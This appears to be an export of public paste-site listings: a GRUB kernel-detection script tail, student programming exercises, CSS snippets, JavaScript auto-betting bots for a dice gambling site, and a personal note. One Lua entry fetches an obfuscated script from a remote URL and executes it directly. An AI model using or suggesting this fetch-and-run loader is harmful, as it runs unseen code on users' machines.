	echo	'$(echo ""$message"" | grub_quote)'
	linux	${rel_dirname}/${basename} root=${linux_root_device_thisversion} ro ${args}
EOF
  if test -n ""${initrd}"" ; then
    # TRANSLATORS: ramdisk isn't identifier. Should be translated.
    message=""$(gettext_printf ""Loading initial ramdisk ..."")""
    initrd_path=
    for i in ${initrd}; do
      initrd_path=""${initrd_path} ${rel_dirname}/${i}""
    done
    sed ""s/^/$submenu_indentation/"" << EOF
	echo	'$(echo ""$message"" | grub_quote)'
	initrd	$(echo $initrd_path)
EOF
  fi
  sed ""s/^/$submenu_indentation/"" << EOF
}
EOF
}

machine=`uname -m`
case ""x$machine"" in
    xi?86 | xx86_64)
	list=
	for i in /boot/vmlinuz-*-[a-z]* /boot/vmlinuz ; do
	    if grub_file_is_not_garbage ""$i"" ; then list=""$list $i"" ; fi
	done ;;
    *)
	list=
	for i in /boot/vmlinuz-* /boot/vmlinux-* /vmlinuz-* /vmlinux-* /boot/kernel-* ; do
                  if grub_file_is_not_garbage ""$i"" ; then list=""$list $i"" ; fi
	done ;;
esac

case ""$machine"" in
    i?86) GENKERNEL_ARCH=""x86"" ;;
    mips|mips64) GENKERNEL_ARCH=""mips"" ;;
    mipsel|mips64el) GENKERNEL_ARCH=""mipsel"" ;;
    arm*) GENKERNEL_ARCH=""arm"" ;;
    *) GENKERNEL_ARCH=""$machine"" ;;
esac

prepare_boot_cache=
prepare_root_cache=
boot_device_id=
title_correction_code=

# Extra indentation to add to menu entries in a submenu. We're not in a submenu
# yet, so it's empty. In a submenu it will be equal to '\t' (one tab).
submenu_indentation=""""

is_top_level=true
while [ ""x$list"" != ""x"" ] ; do
  linux=`version_find_latest $list`
  basename=`basename $linux`
  dirname=`dirname $linux`
  rel_dirname=`make_system_path_relative_to_its_root $dirname`
  version=`echo $basename | sed -e ""s,^[^0-9]*-,,g""`
  real_version=
  if [ ""x${SLACKWARE_ADD_KERNEL_VERSIONS}"" = xtrue ]; then
     real_version=$(readlink $linux | sed -e 's,^[^0-9]*-,,g')
  fi
  alt_version=`echo $version | sed -e ""s,\.old$,,g""`
  linux_root_device_thisversion=""${LINUX_ROOT_DEVICE}""

  # More that one in ""list"", then we are not using vmlinuz, so skip it.
  if [ $(echo ""$list"" | wc -w) -gt 1 ]; then
    if [ ""x$version"" = xvmlinuz ]; then
       list=$(echo $list | tr ' ' '\n' | grep -vx ""$linux"" | tr '\n' ' ')
       continue
     fi
  fi
  gettext_printf ""Found linux image: %s\n"" ""$linux"" >&2

  initrd_early=
  for i in ${GRUB_EARLY_INITRD_LINUX_STOCK} \
	   ${GRUB_EARLY_INITRD_LINUX_CUSTOM}; do
    if test -e ""${dirname}/${i}"" ; then
      initrd_early=""${initrd_early} ${i}""
    fi
  done

  initrd_real=
  for i in ""initrd.img-${version}"" ""initrd-${version}.img"" ""initrd-${version}.gz"" \
	   ""initrd-${version}"" ""initramfs-${version}.img"" \
	   ""initrd.img-${alt_version}"" ""initrd-${alt_version}.img"" \
	   ""initrd-${alt_version}"" ""initramfs-${alt_version}.img"" \
	   ""initramfs-genkernel-${version}"" \
	   ""initramfs-genkernel-${alt_version}"" \
	   ""initramfs-genkernel-${GENKERNEL_ARCH}-${version}"" \
	   ""initramfs-genkernel-${GENKERNEL_ARCH}-${alt_version}"" \
	   ""initrd.gz""; do
    if test -e ""${dirname}/${i}"" ; then
      initrd_real=""${i}""
      break
    fi
  done

  flavor=""""
  if echo $(readlink $linux | cut -d- -f1-2) | grep -wq vmlinuz-huge ; then
    if [ ""x${SLACKWARE_DISABLE_INITRD_HUGE}"" = xtrue ]; then
      initrd_real=""""
    fi
    flavor=""huge""
  elif echo $(readlink $linux | cut -d- -f1-2) | grep -wq vmlinuz-generic ; then
    flavor=""generic""
  fi

  initrd=
  if test -n ""${initrd_early}"" || test -n ""${initrd_real}""; then
    initrd=""${initrd_early} ${initrd_real}""

    initrd_display=
    for i in ${initrd}; do
      initrd_display=""${initrd_display} ${dirname}/${i}""
    done
    gettext_printf ""Found initrd image: %s\n"" ""$(echo $initrd_display)"" >&2
  fi

  config=
  for i in ""${dirname}/config-${version}"" ""${dirname}/config-${alt_version}"" ""/etc/kernels/kernel-config-${version}"" ; do
    if test -e ""${i}"" ; then
      config=""${i}""
      break
    fi
  done

  initramfs=
  if test -n ""${config}"" ; then
      initramfs=`grep CONFIG_INITRAMFS_SOURCE= ""${config}"" | cut -f2 -d= | tr -d \""`
  fi

  if test -z ""${initramfs}"" && test -z ""${initrd_real}"" ; then
    # ""UUID="" and ""ZFS="" magic is parsed by initrd or initramfs.  Since there's
    # no initrd or builtin initramfs, it can't work here.
    if [ ""x${GRUB_DEVICE_PARTUUID}"" = ""x"" ] \
	|| [ ""x${GRUB_DISABLE_LINUX_PARTUUID}"" = ""xtrue"" ]; then

	linux_root_device_thisversion=${GRUB_DEVICE}
    else
	linux_root_device_thisversion=PARTUUID=${GRUB_DEVICE_PARTUUID}
    fi
  fi

  # The GRUB_DISABLE_SUBMENU option used to be different than others since it was
  # mentioned in the documentation that has to be set to 'y' instead of 'true' to
  # enable it. This caused a lot of confusion to users that set the option to 'y',
  # 'yes' or 'true'. This was fixed but all of these values must be supported now.
  if [ ""x${GRUB_DISABLE_SUBMENU}"" = xyes ] || [ ""x${GRUB_DISABLE_SUBMENU}"" = xy ]; then
    GRUB_DISABLE_SUBMENU=""true""
  fi

  if [ ""x$is_top_level"" = xtrue ] && [ ""x${GRUB_DISABLE_SUBMENU}"" != xtrue ]; then
    linux_entry ""${OS}"" ""${version}"" simple \
    ""${GRUB_CMDLINE_LINUX} ${GRUB_CMDLINE_LINUX_DEFAULT}""

    submenu_indentation=""$grub_tab""

    if [ -z ""$boot_device_id"" ]; then
	boot_device_id=""$(grub_get_device_id ""${GRUB_DEVICE}"")""
    fi
    # TRANSLATORS: %s is replaced with an OS name
    echo ""submenu '$(gettext_printf ""Advanced options for %s"" ""${OS}"" | grub_quote)' \$menuentry_id_option 'gnulinux-advanced-$boot_device_id' {""
    is_top_level=false
  fi

  linux_entry ""${OS}"" ""${version}"" advanced \
              ""${GRUB_CMDLINE_LINUX} ${GRUB_CMDLINE_LINUX_DEFAULT}""
  if [ ""x${GRUB_DISABLE_RECOVERY}"" != ""xtrue"" ]; then
    linux_entry ""${OS}"" ""${version}"" recovery \
                ""single ${GRUB_CMDLINE_LINUX}""
  fi

  list=`echo $list | tr ' ' '\n' | fgrep -vx ""$linux"" | tr '\n' ' '`
done

# If at least one kernel was found, then we need to
# add a closing '}' for the submenu command.
if [ x""$is_top_level"" != xtrue ]; then
  echo '}'
fi

echo ""$title_correction_code""
"
yZcPp8N1,XM Group &#8211; How to Claim $30 Forex Welcome Bonus,reviewbrokers,PHP,Sunday 24th of September 2023 09:04:40 AM CDT,https://www.reviewbrokers.net/xm-group-how-to-claim-30-forex-welcome-bonus/
eWhqjpEr,JavaScript Fetch API for WordPress Admin-ajax (GET),shoyebzz,JavaScript,Sunday 24th of September 2023 08:39:24 AM CDT,"var requestOptions = {
      method: ""GET"",
      redirect: ""follow"",
    };

    
    fetch(
      formAction + ""?action=sumw_product_search&search="" + searchQuery,
      requestOptions
    )
    .then((res) => {
        return res.json(); // Parse the response as JSON
    })
    .then((products) => {
        console.log(products);
    })
    .catch((error) => {
        console.error(""error"", error); // Log the error if there is one
    });"
fVKGAmii,Polina Java 1-2,Tiranka1861,Java,Sunday 24th of September 2023 08:36:53 AM CDT,"//Лабораторная 2. Java
import java.util.Scanner;
public class scratch {
    public static void main(String[] args) {
        Scanner in = new Scanner(System.in);    //имя для сканера in не особо хорошее, не уверена, что проверяющий оценит. Стандартное имя scan обычно берут
        int num = 0; //Натуральное число, введенное пользователем.
        double sum = 0; //Искомая сумма.  //тта же идея с инициализацией в 1 и минус одна итерация
        boolean isIncorrect = true; //Проверка на правильность ввода.   //бесполезная инициализация( сразу же меняешь потом, лучше не инициализировать вообще
        System.out.println(""Программа считает сумму всех членов последовательности вида: 1+1/2+...+1/n.\n"");
        do { //Проверка на правильность ввода данных пользователем.
            isIncorrect = false;
            System.out.println(""Введите натуральное число: "");
            try {
                num = Integer.parseInt(in.nextLine());//Ввод числа с консоли.
            } catch (NumberFormatException e) {
                System.err.println(""Введенные данные не удовлетворяют условию. Поверьте правильность ввода!!!"");    //классная тема с вывожом ошибок через err, есть такая же в плюсах, пишется как cerr вместо cout. Если интересно, можешь с этим поиграться
                isIncorrect = true;
            }
            if (!isIncorrect && num < 1) {
                System.err.println(""Введенные данные не удовлетворяют условию. Введите НАТУРАЛЬНОЕ число!!!"");
                isIncorrect = true;
            }
        } while (isIncorrect);
        //после ввода обязательно закрывать сканера, вот прямо на место этого коммента
        num++;
        for (int i = 1 ; i < num ; i++) {//Подсчет суммы элементов последовательности.
            sum += 1 / (double)i;   //то же самое, что и в плюсах -- я бы посоветовала сразу счетчик в тип double объявять, вместо приведения типов
        }
        System.out.println(""\nСумма членов заданной последовательности равна: "");
        System.out.printf(""%.5f"", sum);//Вывод значения. Фиксирование пяти знаков после запятой.
    }
}
"
1r4bZKi4,Polina C++ 1-2 pt.2,Tiranka1861,C++,Sunday 24th of September 2023 08:25:43 AM CDT,"#include <iostream>
#include <iomanip>
#include <windows.h>
using namespace std;
int main()
{
    SetConsoleOutputCP(1251);//Позволяет выводить русские символы. Подключает кодовую страницу 1251, которая отвечает за русский язык.
    int num = 0; //Натуральное число, введенное пользователем.
    double sum = 0; //Искомая сумма.
    bool isIncorrect = true; //Проверка на корректность введенных данных.
    cout <<""Sum: 1+1/2+...+1/n.\n\n""; //Цель программы. //поменяла текст, у меня идиешка не шарит раз русскую консоль вообще, не боись, это я для себя
    while (isIncorrect) {
        isIncorrect = false;
        cout << ""Enter natural num:\n"";
        cin >> num;
        if (cin.fail()) {
            cin.clear();
            while (cin.get() != '\n');
            isIncorrect = true;
            cout <<""Error NAN!!!\n"";
        }
        if (!isIncorrect && num < 1) {
            cin.clear();
            while (cin.get() != '\n');
            cout <<""Error not natural!!!\n"";
            isIncorrect = true;
        }
        if (!isIncorrect && cin.get() != '\n') {
            cin.clear();
            while (cin.get() != '\n');
            cout <<""Error NAN2!!!\n"";
            isIncorrect = true;
        }
    }
    num ++;
    for (int i = 1; i < num; i++) { //тоже можно проинициализировать сумму с 1 и минус одну итерацию
        sum += 1 / (double)i;//Подсчет суммы. //можно нарваться на вопросы про приведение типов, легче сделать счетчик переменной типа double сразу в объявлении в цикле. Необязательно, на самом деле, просто рекомендация, лично мне все нравится
    }
    cout <<""\nResult:"" << setprecision(5) << fixed << sum << "".\n""; //Вывод значения. Фиксирование пяти знаков после запятой.
}
"
2XX6Uvht,demo freedoge,coinwalk,JavaScript,Sunday 24th of September 2023 08:25:43 AM CDT,"var measly = parseFloat(document.getElementById('cryptovalue').innerHTML);
var baby = Number((measly/100).toFixed(8));
var moon = baby;
var taget = 20000;
var tens = (baby*10);
var sevens = (baby*7);
var baboon = false;
var upper = 7;
var downer = 3;
var zoom = ((Math.floor(measly/tens))*tens);
var zoomer = ((Math.floor(measly/tens))*tens);
var olzerer = ((Math.floor(measly/tens))*tens);
var mith = 2;
var bill = true;
var brother = measly;
var boon = 0;
var zuel = parseFloat(document.getElementById('cryptovalue').innerHTML);




function get(){
zuel = parseFloat(document.getElementById('pct_balance').value);
if ((zuel>(zoom+(moon*upper)))&&(zuel>=olzerer)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 5;
    mith = 2;
    zoom = parseFloat(zuel);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>(zoom+(moon*upper)))&&(zuel<olzerer)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 5;
    zoom = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(bill)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 2;
    mith = 0;
    bill = false; 
   zoom = parseFloat(zuel);
    zoomer = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(!bill)) {
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>=(olzerer+(tens*mith)))&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if (moon>(measly/2)){
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
    if (zuel >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }  
if (((zuel!=brother)&&(boon>=1)){
brother = parseFloat(burgzie);
boon = 0;
}
if ((zuel==brother)&&(boon<=0)){   
document.getElementsByClassName('form-control').winchance.value = 50;
(document.getElementById('cryptomultiply').value = ((moon*1).toFixed(8)));
reclc();
multiply(0);
boon = 1;
}
setTimeout(() => get(), 1);
}
get();

"
HMMNK6Eu,CHESS!,HairBaconGamming,Lua,Sunday 24th of September 2023 08:12:44 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/HairBaconGamming/CHESS-/main/obf_71zFTJUjaW8B00vw79e8Am1Ht8fUgFMqH94785VtJ47JaeSkm3IU5812Sa3yeGCX.lua""))()"
aJexFiKs,Delete From Table JS Advanced,TZinovieva,JavaScript,Sunday 24th of September 2023 08:10:40 AM CDT,"function deleteByEmail() {
    let inputText = document.querySelector('input[name=""email""]').value;
    let emails = document.querySelectorAll('tr td:nth-child(2)');
    let result = document.getElementById(""result"");
    let found = false;
    
    Array.from(emails).forEach(function(email) {
        let emailAddress = email.textContent;
        if (emailAddress === inputText) {
            let row = email.parentElement;
            row.remove();
            result.textContent = ""Deleted"";
            found = true;
        }
    });

    if (!found) {
        result.textContent = ""Not found."";
    }
}"
3F9sDd8X,++ snowybot update,coinwalk,JavaScript,Sunday 24th of September 2023 08:10:13 AM CDT,"var measly = parseFloat(document.getElementById('pct_balance').value);
var baby = Number((measly/800).toFixed(8));
var moon = baby;
var taget = 200000;
var tens = (baby*10);
var sevens = (baby*7);
var baboon = false;
var upper = 7;
var downer = 3;
var zoom = ((Math.floor(measly/tens))*tens);
var zoomer = ((Math.floor(measly/tens))*tens);
var olzerer = ((Math.floor(measly/tens))*tens);
var mith = 2;
var bill = true;
var zuel = parseFloat(document.getElementById('pct_balance').value);

 
function get(){
zuel = parseFloat(document.getElementById('pct_balance').value);
if ((zuel>(zoom+(moon*upper)))&&(zuel>=olzerer)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 5;
    mith = 2;
    zoom = parseFloat(zuel);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>(zoom+(moon*upper)))&&(zuel<olzerer)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 5;
    zoom = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(bill)) {
    moon = Number((moon*2).toFixed(8));
    upper = 5;
    downer = 2;
    mith = 0;
    bill = false; 
   zoom = parseFloat(zuel);
    zoomer = parseFloat(zuel);
}
if ((zuel<(zoomer-(moon*downer)))&&(!bill)) {
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if ((zuel>=(olzerer+(tens*mith)))&&(zuel<(((Math.floor(zuel/tens))*tens)+sevens))){
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
if (moon>(measly/2)){
    moon = baby;
    upper = 7;
    downer = 3;
    mith = 1;
    bill = true;
    measly = parseFloat(zuel);
    zoomer = ((Math.floor((parseFloat(zuel))/tens))*tens);
    zoom = ((Math.floor((parseFloat(zuel))/tens))*tens);
    olzerer = ((Math.floor((parseFloat(zuel))/tens))*tens);
}
    if (zuel >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }     
 
var funeral = Number((zuel - measly).toFixed(8));
console.log(""profit"");
console.log(funeral); 
        $('#pct_chance').val(49.5);
        $('#pct_bet').val(((moon*1).toFixed(8)));
        $('#a_lo').click();
    setTimeout(() => get(), 1);
}
get();"
K9pWuGRn,Add / Delete JS Advanced,TZinovieva,JavaScript,Sunday 24th of September 2023 08:09:24 AM CDT,"function addItem() {
    const inputText = document.getElementById('newItemText').value;
    
    if (inputText.trim() !== '') {
        const items = document.getElementById('items');
        const newLi = document.createElement('li');
        newLi.textContent = inputText;
        
        const deleteLink = document.createElement('a');
        deleteLink.href = '#';
        deleteLink.textContent = '[Delete]';
        
        deleteLink.addEventListener('click', function(event) {
            event.preventDefault();
            newLi.remove();
        });
        
        newLi.appendChild(deleteLink);
        items.appendChild(newLi);
        
        document.getElementById('newItemText').value = '';
    }
}
"
Y59ANMz1,Polina Delphi 1-2,Tiranka1861,Delphi,Sunday 24th of September 2023 08:07:10 AM CDT,"Program Lab2;
Uses
    System.SysUtils;
Var
    Num, I: Integer;//Натуральное число, введенное пользователем.
    Sum: Double;//Искомая сумма.
    IsIncorrect: Boolean;//Проверка на корректность введенных данных.
Begin
    Num := 0;
    Sum := 0;  //инициализация лучще с 1, ниже опишу
    I := 1;//Счётчик.  Вот инициализация счетчика не обязательна, эту строчку можешь сносить
    IsIncorrect := True;
    Writeln('Программа считает сумму всех членов последовательности вида: 1+1/2+...+1/n.',#10);
    Repeat
        Writeln('Введите натуральное число: ');
        IsIncorrect := True;
        Try
            Readln(Num);
        Except
            IsIncorrect := False;
            Writeln('Введенные данные не удовлетворяют условию. Поверьте правильность ввода!!!');
        End;
        If IsIncorrect and (Num < 1) Then
        Begin
            IsIncorrect := False;
            Writeln('Введенные данные не удовлетворяют условию. Введите НАТУРАЛЬНОЕ число!!!');
        End;
    Until (IsIncorrect);
    For I := 1 To Num Do  //вот тут лишняя итерация, сумме сразу присваиваешь 1 и делаешь с двух цикл (1/1=1, бесполезная итерация, если инициализация суммы от 1)
    Begin            //лишние begin-end. Один только оператор, скобки здесь не нужны. Личное постановление  ГВ, старшие тут вас обманули
        Sum += 1 / i;//Подсчёт суммы. Делфи не понимает +=, надо прописывать Sum := Sum + 1 / I, переменная-четчик с большой буквы
    End;
    Writeln(#10, 'Сумма членов заданной последовательности равнa: ', Sum:5:5, '. ');
    Readln;
End.
"
bNRf4aVu,Class Obj ex1,olp_EX,Python,Sunday 24th of September 2023 07:48:27 AM CDT,"# Створення класу Animal
class Animal():
    def __init__(self, kind, height, legs):
        self.kind = kind
        self.height = height
        self.legs = legs

# Зчитування значень характеристик тварини з клавіатури
k = input('Вид тварини: ')
h = int(input('Зріст: '))
l = int(input('Кількість лап: '))

# Створення екземпляра класу Animal з введеними характеристиками
a1 = Animal(k, h, l)

# Виведення характеристик об'єкта a1
print('Вид:', a1.kind)
print('Зріст:', a1.height)
print('Лапи:', a1.legs)


"
vAJHc1CR,Untitled,mrlolthe1st,C++,Sunday 24th of September 2023 07:34:27 AM CDT,"#include <iostream>
#include <numeric>
#include <ranges>
#include <vector>

int bar() {
  int x = 123;
  int c = 0;
  while (x) c += x & 1, x >>= 1;
  return x;
}
int buzz = bar();
int main() {
}"
EgCJLkpW,Untitled,mrlolthe1st,C++,Sunday 24th of September 2023 07:17:17 AM CDT,"#include <iostream>
#include <numeric>
#include <ranges>
#include <vector>
void foo() {
  static int counter = 10;
  std::cout << ++counter << std::endl;
}
int main() {
  foo();
  foo();
}"
W75Mxpwn,menu-elastico-para-una-landing-page,edefrutos,CSS,Sunday 24th of September 2023 07:14:19 AM CDT,".ov-wrapper nav {
  position: relative;
  display: flex;
}
.ov-wrapper nav label {
  flex: 1;
  width: 100%;
  z-index: 1;
  cursor: pointer;
}
.ov-wrapper nav label a {
  font-family: 'Archivo',Helvetica,Arial,Lucida,sans-serif;
  position: relative;
  z-index: 0;
  color: #1d1f20;
  font-size: 20px;
  font-weight: 500;
  text-decoration: none;
  transition: color 0.6s ease;
  display: inline-block;
  padding: 22px 24px;
  width: 100%;
}
.ov-wrapper nav #menu-01:checked ~ label.menu-01 a,
.ov-wrapper nav #menu-02:checked ~ label.menu-02 a,
.ov-wrapper nav #menu-03:checked ~ label.menu-03 a,
.ov-wrapper nav #menu-04:checked ~ label.menu-04 a,
.ov-wrapper nav #menu-05:checked ~ label.menu-05 a {
  color: #fff;
}
.ov-wrapper nav label a i {
  font-size: 21px;
  margin: 0 9px;
}
.ov-wrapper nav .tab {
  position: absolute;
  height: 100%;
  width: 20%;
  left: 0;
  bottom: 0;
  z-index: 0;
  border-radius: 100px;
  background: linear-gradient(45deg, #ff4200 0%,#342bff 100%);
  transition: 0.6s cubic-bezier(0.28, 0.45, 0.265, 1.55);
}
.ov-wrapper nav #menu-02:checked ~ .tab {
  left: 20%;
}
.ov-wrapper nav #menu-03:checked ~ .tab {
  left: 40%;
}
.ov-wrapper nav #menu-04:checked ~ .tab {
  left: 60%;
}
.ov-wrapper nav #menu-05:checked ~ .tab {
  left: 80%;
}
.ov-wrapper nav input {
  display: none;
}
@media only screen and (max-width: 980px) {
  .ov-wrapper nav label a {
    font-size: 18px;
    padding: 20px 16px;
  }
  .ov-wrapper nav label a i {
    font-size: 18px;
  }
}
@media only screen and (max-width: 768px) {
  .ov-wrapper nav label a {
    font-size: 16px;
    padding: 16px 14px;
    text-align: center;
  }
  .ov-wrapper nav label a i {
    font-size: 16px;
    margin: 0;
  }
  .ov-wrapper nav label a span {
    display: none;
  }
}"
62JdLuBS,Add dwg mime types,CodeDropz,PHP,Sunday 24th of September 2023 07:13:17 AM CDT,"function wc_edit_upload_types($existing_mimes = array()) {
    $existing_mimes['dwg'] = 'application/acad';
    return $existing_mimes;
}
add_filter('upload_mimes', 'wc_edit_upload_types');"
NVPExM04,Carrusel Galería Masonry,edefrutos,CSS,Sunday 24th of September 2023 07:03:39 AM CDT,".edf-seccion-slider-masonry > .et_pb_row {
  height: 100%;
}

/* Estilos botón */
.edf-info-slider-masonry {
  transition: all .5s ease;
  opacity: 0;
}
.edf-info-slider-masonry button {
  background-color: #890773; /* Color fondo boton */
  border: none;
  color: #ffffff; /* Color texto boton */
  padding: 9px 16px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 12px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0px;
  cursor: pointer;
  border-radius: 3px;
  transition: all .3s;
  margin-top: 10px;
}
.edf-info-slider-masonry button:hover {
  background-color: #3b0132; /* Color botón hover */
  color: #ffffff; /* Color texto botón hover */
  letter-spacing: 1px;
}

/* Estilos efecto hover columnas masonry */
.edf-seccion-slider-masonry .edf-columna-masonry {
  overflow: hidden;
}
.edf-seccion-slider-masonry .edf-img-slider-masonry {
  transition: all .5s ease;
}
.edf-seccion-slider-masonry .edf-columna-masonry:hover .edf-img-slider-masonry {
  transform: scale(1.05) rotate(1deg);
}
.edf-seccion-slider-masonry .edf-columna-masonry:hover .edf-info-slider-masonry {
  opacity: 1;
}
@media only screen and (max-width: 768px) {
  .edf-info-slider-masonry {
    transition: all .5s ease;
     opacity: 1;
   }
  .edf-info-slider-masonry button {
    padding: 9px 16px;
    font-size: 10px;
    margin-top: 5px;
  }
}

/* Ajustes columnas responsive */
@media (max-width: 480px) {
.et_pb_row_1-4_1-4>.et_pb_column.et_pb_column_1_4, .et_pb_row_1-4_1-4_1-2>.et_pb_column.et_pb_column_1_4, .et_pb_row_4col>.et_pb_column.et_pb_column_1_4 {
    width: 47.25% !important;
    margin-right: 5.5% !important;
}
.et_pb_row_1-4_1-4>.et_pb_column.et_pb_column_1_4:nth-child(2n), .et_pb_row_1-4_1-4_1-2>.et_pb_column.et_pb_column_1_4:nth-child(2n), .et_pb_row_4col>.et_pb_column.et_pb_column_1_4:nth-child(2n) {
    margin-right: 0 !important;
}
.et_pb_row_1-2_1-4_1-4>.et_pb_column.et_pb_column_1_4 {
    width: 47.25% !important;
    margin-right: 5.5% !important;
}
.et_pb_row_1-2_1-4_1-4>.et_pb_column.et_pb_column_1_2, .et_pb_row_1-2_1-4_1-4>.et_pb_column.et_pb_column_1_4:nth-child(odd) {
    margin-right: 0 !important;
}
}

/* Estilos ov-swiper-masonry */
.edf-swiper-masonry {
  overflow: hidden;
}
.edf-seccion-slider-masonry.swiper-slide {
  height: 100vh !important;
}
.edf-swiper-masonry .swiper-button-next,
.edf-swiper-masonry .swiper-button-prev {
  width: 70px;
  height: 70px;
  background: #fff;
  top: 49%;
}
.edf-swiper-masonry .swiper-button-next:after,
.edf-swiper-masonry .swiper-button-prev:after {
  font-size: 30px;
  font-weight: 800;
  color: #000;
}
@media only screen and (max-width: 768px) {
  .edf-swiper-masonry .swiper-button-next,
  .edf-swiper-masonry .swiper-button-prev {
    width: 56px;
    height: 56px;
    top: 47%;
  }
  .edf-swiper-masonry .swiper-button-next:after,
  .edf-swiper-masonry .swiper-button-prev:after {
    font-size: 20px;
  }
}"
hv8KBUTr,MP06_UF1,Mike7GB,Java,Sunday 24th of September 2023 07:03:23 AM CDT,"*************************
----- CALSE PERSONA -----
*************************

public class Persona {

    // Atributos
    private String nombre;
    private String apellido;
    private String ciudad;
    private String nacionalidad;
    private int edad;

    // Constructor sin parámetros
    public Persona() {
        this.nombre = """";
        this.apellido = """";
        this.ciudad = """";
        this.nacionalidad = """";
        this.edad = 0;
    }

    // Constructor con 1 parámetro (nombre)
    public Persona(String nombre) {
        this.nombre = nombre;
        this.apellido = """";
        this.ciudad = """";
        this.nacionalidad = """";
        this.edad = 0;
    }

    // Constructor con 5 parámetros (nombre, apellido, ciudad, nacionalidad, edad)
    public Persona(String nombre, String apellido, String ciudad, String nacionalidad, int edad) {
        this.nombre = nombre;
        this.apellido = apellido;
        this.ciudad = ciudad;
        this.nacionalidad = nacionalidad;
        this.edad = edad;
    }

    // Getters y Setters
    public String getNombre() {
        return this.nombre;
    }
    
    public void setNombre(String nombre){
        this.nombre = nombre;
    }
    
    public String getApellido() {
        return this.apellido;
    }
    
    public void setApellido(String apellido){
        this.apellido = apellido;
    }
    
    public String getCiudad() {
        return this.ciudad;
    }
    
    public void setCiudad(String ciudad){
        this.ciudad = ciudad;
    }
    
    public String getNacionalidad() {
        return this.nacionalidad;
    }
    
    public void setNacionalidad(String nacionalidad){
        this.nacionalidad = nacionalidad;
    }
    
    public int getEdad() {
        return this.edad;
    }
    
    public void setEdad(int edad){
        this.edad = edad;
    }
    
    // Métodos
    
    // Mostrar todos los campos
    public String mostrarInfo(){
        return ""INFORMACIÓN PERSONA \nNombre: "" + nombre + ""\nApellido: "" + apellido + ""\nCiudad: "" + ciudad + ""\nNacionalidad: "" + nacionalidad + ""\nEdad: "" + edad;
    }
    
}


*************************
--------- MAIN ----------
*************************

public class UF1 {

    public static void main(String[] args) {
        
        Persona persona = new Persona();
        persona.setNombre(""Juan"");
        persona.setApellido(""Pérez"");
        persona.setCiudad(""Madrid"");
        persona.setNacionalidad(""Española"");
        persona.setEdad(60);
        
        Persona persona1 = new Persona(""Miquel"");
        persona1.setApellido(""Riba"");
        persona1.setCiudad(""Barcelona"");
        persona1.setNacionalidad(""Española"");
        persona1.setEdad(35);
        
        Persona persona2 = new Persona(""Clark"", ""Kent"", ""Metrópolis"", ""Estadounidense"", 40);
        
        System.out.println(persona.mostrarInfo());
        System.out.println("""");
        System.out.println(persona1.mostrarInfo());
        System.out.println("""");
        System.out.println(persona2.mostrarInfo());
    }
}
"
3xj1Hjxv,Untitled,xidharth,JavaScript,Sunday 24th of September 2023 07:02:22 AM CDT,"I hope you remember to be kind to yourself today. I hope you remember that yes, even though the world is messed up, it isn't your responsibility to hold it up every moment.
The fight will keep going but sometimes, it is okay to walk out of the ring for a time out. I hope you will extend the same understanding you extend to everyone one, to yourself as well for once.
I hope you start choosing yourself over anything and quit getting yourself broken in the process of fixing someone.
I hope you get some good done to you when you do not expect it. That today, your coke tastes just a little bit better, the sun shines a little bit brighter, the colors seem a little more vibrant and life seems just a little bit better than it usually does.
From now on, prioritize your well-being by cherishing relationships that uplift and inspire you while having the courage to distance yourself from those who drain your mental peace and energy. Be mindful of impulsive actions, and consider being more open-minded and flexible. Surround yourself with individuals who nurture your mental and emotional health, recognizing their value. Self-care is not selfish but essential for your happiness and growth. Embrace this new chapter with determination to protect your well-being,

This is the part where you unwrap urself from the burdens and the self doubts they planted like weeds on ur lungs. This is the part where u wrap urself in cloths that shimmer, away from the armors u once shielded urself with. 
I wish to take some burden of you I really do and I hope you let me too.

And I hope that one day, you do not just think all of this but really believe  and do it too.


You are the most perfect human mess I will find. Don't fall for those beautiful smiling pictures of her, you've no idea about her sudden anger which needs a calm personality next to her to handle,
Someone with same ""taile sorry navane ma ni vandina"" ego with her? Forget about it, it won't work.
The most beautiful blossom of flowers and the sparks of anger, she'll always have one of those.
She is a good soul, not a soul that can be bought, no matter the offer.
